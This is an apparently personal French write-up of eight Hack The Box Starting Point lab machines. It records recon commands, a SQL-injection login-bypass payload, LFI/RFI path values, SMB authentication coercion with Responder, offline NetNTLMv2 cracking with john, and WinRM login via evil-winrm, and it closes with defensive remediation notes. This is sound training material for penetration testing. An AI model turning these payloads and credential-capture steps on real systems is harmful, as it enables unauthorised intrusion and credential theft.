# HTB — Starting Point (Tier 0–1)

> Le grand saut : quitter les environnements guidés pour attaquer des machines inconnues en totale autonomie (writeup fermé, documenté après coup). Huit machines rootées en solo, de la première prise de contact avec un service inconnu jusqu'au premier vrai chaînage et à la coercition d'authentification SMB.
>
> Flags retirés. Rappel setup : VPN HTB via `sudo openvpn <fichier>.ovpn` (le `sudo` crée l'interface `tun0`, opération privilégiée). Laisser ce terminal ouvert, travailler dans un 2ᵉ onglet. Machine d'attaque = Kali.

## Tableau de chasse

| # | Box | Tier | Service / faille |
|---|-----|------|------------------|
| 1 | Meow | 0 | telnet · root + mot de passe vide |
| 2 | Fawn | 0 | FTP anonyme (vsftpd) |
| 3 | Redeemer | 0 | Redis 6379 (accès non authentifié) |
| 4 | Dancing | 0 | SMB 445 (partage anonyme) |
| 5 | Appointment | 1 | Web · SQLi login bypass (A03) |
| 6 | Sequel | 1 | MariaDB 3306 · root sans mot de passe (A05) |
| 7 | Crocodile | 1 | FTP creds en clair → réutilisés sur login web (1er chaînage) |
| 8 | Responder | 1 | LFI/RFI → coercition SMB → NetNTLMv2 → crack → WinRM |

*(Three, Vaccine, Oopsie, Archetype et Unified — également rootées sur ce parcours — ont leur writeup dédié dans ce dépôt.)*

---

## Box 1 — Meow (Tier 0)

Un seul port. Le vrai exercice : raisonner face à un service inconnu.

```bash
nmap <ip>            # → 23/tcp open telnet
nmap -sV <ip>        # → 23/tcp telnet, "Linux telnetd"
```

Démarche autonome face à telnet (inconnu) :
1. `searchsploit telnet` → des exploits de privilège, mais aucun foothold.
2. `msfconsole` → rien d'exploitable.
3. Déduction : puisque aucun exploit ne sert de porte, telnet est un service de connexion à distance (l'ancêtre non chiffré de SSH).

```bash
telnet <ip>
Meow login: root         # login root, mot de passe VIDE → connecté
cat /root/flag.txt
```

**Leçons**
- `command not found` = RELIRE la frappe (typo `telenet`), pas installer un paquet.
- Escalader les scans progressivement : un `nmap -sV --script vuln -p-` de 19 min sur une machine à un seul port = temps perdu quand le 1er scan suffisait.

---

## Box 2 — Fawn (Tier 0)

```bash
nmap <ip>               # → 21/tcp open ftp
nmap -sV -p 21 <ip>     # → vsftpd 3.0.3  (scan CIBLÉ, 1 s)
```
Leçon de Meow appliquée : scan de version ciblé sur le port trouvé.

```bash
ftp -a <ip>     # -a = login ANONYME → 230 Login successful
ftp> ls         # → flag.txt
ftp> get flag.txt
ftp> exit
```
FTP : port 21, protocole en clair (équivalent sécurisé = SFTP via SSH), user anonyme = `anonymous`, code 230 = « Login successful », `get` = télécharger.

**Leçons**
- Flags sensibles à la casse : `-sV` ≠ `-sv`.
- `cat` tapé dans le prompt `ftp>` → `?Invalid command` : à l'intérieur du client FTP je parle à la FTP, pas au shell. Récupérer via `get` → `exit` → lecture locale.

---

## Box 3 — Redeemer (Tier 0)

```bash
nmap <ip>               # → "All 1000 scanned ports are CLOSED" (trompeur)
nmap -p- -T4 <ip>       # → 6379/tcp open redis
nmap -sV -p 6379 <ip>   # → Redis 5.0.7
```

**Leçon-mère n°1 — le scan qui « ne donne rien » :** `nmap <ip>` ne scanne QUE les 1000 ports les plus courants, et Redis (6379) n'y est pas. Un « rien » au scan par défaut ne veut pas dire « rien d'ouvert » mais « rien parmi les courants ». Le vrai scan = `nmap -p-` (tous les 65535 ports).

**Leçon-mère n°2 — les templates de timing `-T0..T5` :** règlent délai entre sondes, parallélisme, timeouts RTT.
- `T3` = défaut · `T4` = rapide ET fiable sur un réseau correct → a trouvé 6379.
- `T5` = trop pressé (`retransmission cap hit` + `host timeout`) → il ABANDONNE l'hôte et peut rater le port.
- Config HTB adoptée : `nmap -p- -T4`, puis `nmap -sV -sC -p <port>`.

Redis = base clé→valeur en mémoire, 16 bases numérotées 0→15.
```bash
redis-cli -h <ip>
> info          # version, OS, "db0:keys=4"
> select 0
> keys *        # → numb flag temp stor
> get flag
```
L'`info` donnait déjà la carte (`db0:keys=4`).

---

## Box 4 — Dancing (Tier 0)

```bash
nmap <ip>    # → 135 msrpc · 139 netbios-ssn · 445 microsoft-ds · 5985 wsman
```
Signature Windows/SMB : le port 445 = microsoft-ds = SMB.

**Leçon-mère : LISTER ≠ ENTRER (2 syntaxes distinctes).** Modèle = un immeuble de bureaux :
```bash
# 1) LIRE le panneau d'accueil (quels partages existent ?)
smbclient -L //<ip> -N
#   → ADMIN$ · C$ · IPC$ · WorkShares

# 2) ENTRER dans un partage précis (chemin UNC, DOUBLE slash)
smbclient //<ip>/WorkShares -N
#   smb: \>   ← prompt = je suis DEDANS
```
- `-L //IP` = lister le catalogue · `//IP/Partage` = entrer (chemin UNC, `//` double slash) · `-N` = *No password* (session nulle/anonyme).

```bash
smb: \> ls ; cd \James.P ; ls      # → flag.txt
smb: \James.P\> get flag.txt       # get = TÉLÉCHARGER vers Kali
```

**Leçons**
- Lire le message `NT_STATUS` : `Not enough '\' characters in service` = cible pas un chemin de partage valide → syntaxe `//IP/Share`.
- `get` = exfiltration (≠ `open`, handle bas niveau quasi jamais utile).
- Précision de frappe : `cd Amy,J` (virgule au lieu du point) → `OBJECT_NAME_NOT_FOUND`.

---

## Box 5 — Appointment (Tier 1)

```bash
nmap -p- -T4 <ip>                 # → port 80 (Apache 2.4.38 Debian)
gobuster dir -u http://<ip>/ -w <wordlist>   # → /images/ puis page de login
```
`gobuster dir` = brute-force de répertoires (`dir` = dossiers, pas sous-domaines). « Not Found » = 404.

Injection SQL (login bypass) — OWASP A03:2021. Requête reconstruite :
```sql
SELECT * FROM users WHERE username='<INPUT>' AND password='<MDP>'
```
Payload dans le champ username (mdp quelconque) :
```
admin' --      (version robuste : admin'-- - )
```
Le `'` ferme la chaîne, le `--` commente la vérification du mot de passe → connecté en admin.

**Leçon — commentaires SQL :**
- `#` = commentaire à UN caractère, sans espace requise.
- `--` = DEUX caractères ET exige une espace juste après → c'est pourquoi `admin' --` peut résister ; parade robuste = `admin'-- -` (le `-` final protège l'espace que les formulaires rognent).
- Écrire le writeup au fil de l'eau (la machine a buggé ici → démarche perdue). Le rapport vaut autant que le root en eJPT.

---

## Box 6 — Sequel (Tier 1)

MariaDB (3306) accessible en `root` SANS mot de passe → OWASP A05 (misconfiguration) / A07 (auth défaillante).

```bash
nmap <ip>                   # → 3306/tcp open mysql
nmap -sV -sC -p 3306 <ip>   # → 5.5.5-10.3.27-MariaDB
mysql -u root -p -h <ip> -P 3306   # -p puis Entrée = mot de passe VIDE → connecté
MariaDB> show databases; use htb; show tables;    # → config, users
MariaDB> describe config;                          # → id, name, value
MariaDB> select value from config;                 # → le flag
```

**Leçons**
- Le prompt `-> ` (continuation) : le CLI SQL n'exécute RIEN tant qu'il ne voit pas le `;` (conscience du prompt). `^C` pour annuler.
- `-u root -p` + Entrée = login blanc (pas l'absence de `-p`).
- Lire le nom EXACT retourné par `show tables;` (`users` pluriel, pas `user`).

---

## Box 7 — Crocodile (Tier 1) — le 1er vrai chaînage

Identifiants en clair exposés sur FTP anonyme → réutilisés sur le login web. Deux services reliés.

```bash
nmap <ip>                   # → 21/ftp · 80/http
nmap -sV -sC -p 21 <ip>     # → vsftpd 3.0.3 + ftp-anon (code 230)
                            #   le script NSE liste DÉJÀ 2 fichiers :
                            #   allowed.userlist  &  allowed.userlist.passwd
```
Le `-sC` (scripts par défaut) révèle les fichiers avant même la connexion FTP.

```bash
ftp -a <ip>
ftp> get allowed.userlist ; get allowed.userlist.passwd ; exit
# un fichier de users + un fichier de mots de passe (en libre-service)
```
```bash
gobuster dir -u http://<ip> -w <wordlist> -x php
#   → login.php (200) · dashboard/ · assets/
```
`-x php` = chercher aussi les fichiers `.php`. On entre dans `login.php` avec une paire user/mdp des deux fichiers FTP → flag.

**Ce qui rend la box spéciale :** une seule faille ne suffit pas, il faut relier deux services.
```
FTP anonyme ──(creds en clair)──► login.php ──► flag
   service A                          service B
```
C'est le geste central du pentest, exactement ce que l'eJPT chronomètre.

**Leçons**
- Face à un outil inconnu, lire l'aide méthodiquement (`gobuster --help` → `dir -h`) au lieu de deviner.
- Conscience du contexte : `la` montrait mon home Kali (mes propres restes), pas la cible.
- Savoir arrêter gobuster (Ctrl+C) dès que `login.php` est trouvé.

---

## Box 8 — Responder (Tier 1) — la plus exigeante

LFI/RFI sur `?page=` → coercition d'authentification SMB → capture d'un NetNTLMv2 → crack → login WinRM. Trois concepts neufs empilés et une route à tailler soi-même. À ne pas confondre : la machine HTB et l'outil Kali portent le même nom.

### Recon
```bash
ping <ip>                       # ttl=127 → signature Windows
curl <ip>                       # → <meta refresh url=http://unika.htb/>  (redirection)
nmap <ip>                       # → 80/http · 5985/wsman (= WinRM)
# → ajouter "<ip>  unika.htb" dans /etc/hosts
gobuster dir -u http://<ip> -w <wordlist> -x php
#   → index.php (200) · img/ css/ js/ inc/ · phpmyadmin (403)
```
Deux signaux : la redirection vers `unika.htb` (peupler `/etc/hosts`) et PHP côté serveur.

### La faille — le paramètre `?page=` (LFI puis RFI)
Le sélecteur de langue charge `index.php?page=french.html`. Le paramètre `page` inclut un fichier :
- **LFI** (local) : `page=../../../../windows/system32/drivers/etc/hosts`.
- **RFI** (distant, chez MOI) : `page=//<MON_IP>/somefile`. C'est ce chemin `//MON_IP` qui déclenche tout.

### Leçon-mère : la coercition d'authentification SMB
Un serveur Windows, quand on lui donne un chemin `\\MON_IP\x`, n'y va pas en silence : en frappant, il présente l'empreinte NetNTLMv2 du compte qui fait tourner le serveur, sans qu'on la lui demande. Je ne « vole » pas le hash : je tends un miroir, et Windows se présente dedans tout seul.

### Armer le piège PUIS tirer
```bash
ip a                            # → tun0 = mon IP d'appât (PAS eth0)
sudo responder -I tun0 -v       # 1) ARMER : le piège écoute (SMB server [ON])
# 2) TIRER dans le navigateur : ...index.php?page=//<tun0>/x
# 3) Terminal Responder → l'empreinte tombe :
# [SMB] NTLMv2-SSP Hash : Administrator::RESPONDER:<hash>
```
Ordre sacré : ARMER avant de TIRER. Déclencher l'inclusion avant que Responder n'écoute → personne n'attrape le « bonjour » → faux négatif.

### Crack — le NetNTLMv2 (≠ NT hash)
```bash
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=netntlmv2 hash.txt   # réafficher (SANS --wordlist)
```
Ce que Responder capture = un NetNTLMv2 = une réponse à un défi (challenge/response), pas le NT hash de la SAM. On ne le rejoue pas (pas de pass-the-hash), on le casse hors-ligne.

### Accès — WinRM depuis Linux
```bash
# Enter-PSSession → "command not found" : cmdlet PowerShell natif de Windows, absent sur Kali.
evil-winrm -i <ip> -u Administrator -p '<mdp_cassé>'   # l'équivalent Linux (WinRM, port 5985)
*Evil-WinRM* PS C:\Users> cd mike\Desktop ; cat flag.txt
```
WinRM = « télécommande Windows » (port 5985, vu au nmap = `wsman`). Client offensif = evil-winrm.

**Leçons**
- `--show` est solitaire (`Invalid options combination` s'il est combiné au crack) : on casse d'abord, on `--show` ensuite.
- NetNTLMv2 ≠ NT hash : deux objets, deux formats John.
- `Administrator` ouvre tout (lecture du Bureau de `mike`). Sur d'autres box, un mot de passe cassé n'ouvre QUE son compte.
- `ip a` = 3 interfaces : seule `tun0` est sur le même réseau que la cible = l'IP d'appât.

---

## Le fil rouge : misconfiguration > exploit

La majorité de ces boxes ne tombent pas par un *exploit* mais par une **misconfiguration** :
- Meow = telnet + root autorisé + mot de passe vide
- Fawn = FTP anonyme + données en clair
- Redeemer = Redis sans authentification
- Dancing = partage SMB anonyme
- Sequel = root MariaDB sans mot de passe
- Crocodile = fichier de mots de passe en lecture anonyme

Ce sont exactement les portes qu'un défenseur ferme sur un serveur durci (`PermitRootLogin no`, `PasswordAuthentication no`, SSH au lieu de telnet, pas d'accès anonyme, pas de compte par défaut). L'œil d'attaquant récolte ce que l'œil de défenseur a appris à verrouiller — attaquer et défendre sont le même savoir vu des deux côtés du mur (profil purple).

Responder change de registre : une faille applicative (LFI/RFI, OWASP A03) combinée à un comportement de protocole (SMB qui s'authentifie seul). Parade double côté défense : valider/filtrer le paramètre `page` (jamais d'inclusion contrôlée par l'utilisateur) et bloquer le SMB (445) sortant pour couper la coercition.

## Leçons transversales

- **Réflexe nmap définitif** : `nmap <ip>` nu = top-1000 ports → un « rien » est trompeur. Toujours `nmap -p- -T4 <ip>`, puis `nmap -sV -sC -p <port>`. `T5` = piège (abandonne l'hôte).
- **Conscience du prompt** : toujours savoir à quel interprète je parle (shell Kali ? `ftp>` ? session telnet ? CLI SQL ?). Une commande valide dans l'un est un `?Invalid command` dans l'autre.
- **Précision de frappe** : la plupart du temps perdu venait de typos, pas de concepts. Rituel : un battement de cœur pour relire la ligne avant Entrée.
- **Le chaînage** (Crocodile, Responder) : une information tirée d'un service n'a de valeur que branchée sur un autre. C'est le cœur du métier.
